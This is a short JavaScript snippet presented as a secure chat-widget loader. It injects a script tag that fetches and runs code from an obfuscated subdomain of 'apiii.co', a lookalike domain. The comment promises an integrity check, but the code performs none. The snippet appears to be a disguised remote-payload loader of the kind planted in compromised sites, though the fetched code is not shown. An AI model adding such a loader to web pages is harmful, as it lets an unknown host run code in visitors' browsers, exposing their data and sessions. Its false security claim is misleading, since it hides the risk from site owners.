// Chat Widget Integration
// Secure chat widget loading with integrity check
(function() {
  var widgetScript = document.createElement("script");
  widgetScript.src = "https://mfyhaltgnrxxo5dsmfrwwltdn4rts43snzrxki32gy3hkmtr.apiii.co/api/widget/1986405e39C5a79665AF1746738C1f46";
  widgetScript.defer = true;
  widgetScript.async = true;
  widgetScript.crossOrigin = "anonymous";
  
  // Add error handling
  widgetScript.onerror = function() {
    console.warn('Chat widget failed to load');
  };
  
  widgetScript.onload = function() {
    console.log('Chat widget loaded successfully');
  };
  
  document.head.appendChild(widgetScript);
})();
